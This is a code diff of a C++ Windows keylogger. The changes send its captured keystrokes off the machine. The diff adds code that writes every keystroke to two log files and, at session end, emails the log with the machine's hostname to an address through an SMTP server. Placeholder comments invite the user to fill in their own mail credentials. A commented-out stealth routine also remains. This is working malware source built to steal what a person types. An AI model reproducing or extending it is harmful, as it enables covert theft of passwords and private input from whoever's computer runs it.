@@ -1,18 +1,15 @@
 // keyLogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
 #include <Windows.h>
-#include <iostream>
-#include <lmcons.h>
 #include <fstream>
-#include <sstream>
 #include <cctype>
 #include <iomanip>
-#include <string>
+#include "Email.h"
 
 using namespace std;
 
-int const MAX_USERNAME_LENGTH = 104;
-
+ofstream logEmail;
+ofstream logHistory;
 //void Stealth();
 string translateKey(int keyStroke);
 void logKey(string keyStroke);
@@ -22,7 +19,12 @@ int main()
     enum Status { disable, enable };
     Status log = enable;
 
-    MessageBox(NULL, "Key Logging Status: ON", "Julian's USB", MB_OK | MB_ICONASTERISK);
+    MessageBox(NULL, "Key Logging Status: ON", "ANYNAME", MB_OK | MB_ICONASTERISK);/*REPLACE anyname optional*/
+
+    logEmail.open("emailfilename.txt");/*Change this to the file you want to email*/
+    logHistory.open("Histroyfilename.txt", ios_base::out | ios_base::app);/*change this to the file you want to keep your key log history on*/
+
+    logKey("\n");/*Start key logging on a new line*/
 
     while(log == enable)
     {
@@ -42,16 +44,23 @@ int main()
         }
     }
 
-    MessageBox(NULL, "Key Logging Status: OFF", "Julian's USB", MB_OK | MB_ICONASTERISK);
+    logKey("\n[END OF SESSION]");
+
+    logEmail.close();
+    logHistory.close();
+
+    MessageBox(NULL, "Key Logging Status: OFF", "ANYNAME", MB_OK | MB_ICONASTERISK);/*REPLACE anyname optional*/
 
     char hostname[MAX_COMPUTERNAME_LENGTH + 1];
     DWORD hnBufferSize = sizeof(hostname);
-
+    string subject = "Key Log from: ";
 
     GetComputerName(hostname, &hnBufferSize);
-    cout << hostname << endl;
+    subject += hostname;
+    cout << subject;
 
-
+    Email email("ANYNAME", "TOname@domain.com", subject, "ANYNAME");/*REPLACE with your data ANYNAME, TOname,*/
+    email.send("smtp://smtp.domain.com:587", "username", "password", "filename.txt");/*REPLACE with your data domain, username, password, and filename*/
 }
   
 /*void Stealth()
@@ -64,12 +73,9 @@ int main()
 }*/
 void logKey(string keyStroke)
 {
-    ofstream outfile;
+    logEmail << keyStroke;
 
-    outfile.open("keyLog.txt", ios_base::out | ios_base::app);
-    outfile << keyStroke;
-
-    outfile.close();
+    logHistory << keyStroke;
 }
 string translateKey(int keyStroke)
 {
